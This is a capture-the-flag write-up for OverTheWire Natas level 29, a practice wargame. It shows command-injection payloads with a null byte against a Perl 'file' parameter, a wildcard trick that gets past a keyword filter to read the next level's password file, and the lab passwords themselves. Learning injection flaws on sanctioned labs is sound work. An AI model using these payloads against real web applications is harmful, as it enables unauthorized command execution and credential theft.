# Natas CTF Solutions  

## Natas Level 29  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Exploit **null byte injection** and **command injection** to read the password file for the next level.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas29.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas29`  
- **Password:** Use the password from Natas Level 28:  
```
31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
```  

![image](https://github.com/user-attachments/assets/e1a65c89-f557-4810-a37c-f89956e6209d)

---

### **Step 3: Command Injection Attempt**  
1. The challenge accepts a `file` parameter that can be used for command injection.  
2. First, test for command injection using:  
```  
http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00  
```  
- The `|ls` part executes the `ls` command.  
- `%00` is a **null byte** used to terminate the string, which helps bypass input validation.  

✅ **Success:** It lists the contents of the directory:  
```
index.pl
```  

![image](https://github.com/user-attachments/assets/8ec3c5b2-4a1a-4ce7-935d-f634f3a3fac8)

---

### **Step 4: Extract the Password**  
1. Next, try reading the password file:  
```  
|cat /etc/natas_webpass/natas30  
```  
2. This command will fail due to input filtering, returning:  
```
meep!
```  

![image](https://github.com/user-attachments/assets/8315903a-1572-4d88-ac81-7507d2295130)

✅ **Why?**  
- The filtering mechanism likely blocks the keyword **"natas."**  

---

### **Step 5: Bypass Filtering with Wildcards**  
Instead of using `natas`, use the `?` wildcard:  
- `?` matches a single character — bypassing the filter.  

```  
|cat /etc/n?tas_webpass/n?tas30 %00  
```  

✅ **Success:** This prints the password for the next level!  

![Password](https://github.com/user-attachments/assets/160b7c78-393f-4662-ba24-61fbe5348464)

---

### **✅ Password for Natas Level 30**  
```
WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
```

---

## 💡 **Lessons Learned**  
✔️ **Command Injection:** Injecting shell commands via URL parameters.  
✔️ **Null Byte Injection:** `%00` can terminate strings and bypass input validation.  
✔️ **Wildcard Injection:** `?` wildcard bypasses keyword filters.  
✔️ **Input Sanitization:** Always sanitize and validate user inputs to prevent command execution.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Command Injection | ![image](https://github.com/user-attachments/assets/8ec3c5b2-4a1a-4ce7-935d-f634f3a3fac8) |  
| Step 5 – Bypass Filtering | ![Password](https://github.com/user-attachments/assets/160b7c78-393f-4662-ba24-61fbe5348464) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 30**:  
👉 [http://natas30.natas.labs.overthewire.org](http://natas30.natas.labs.overthewire.org)  

---
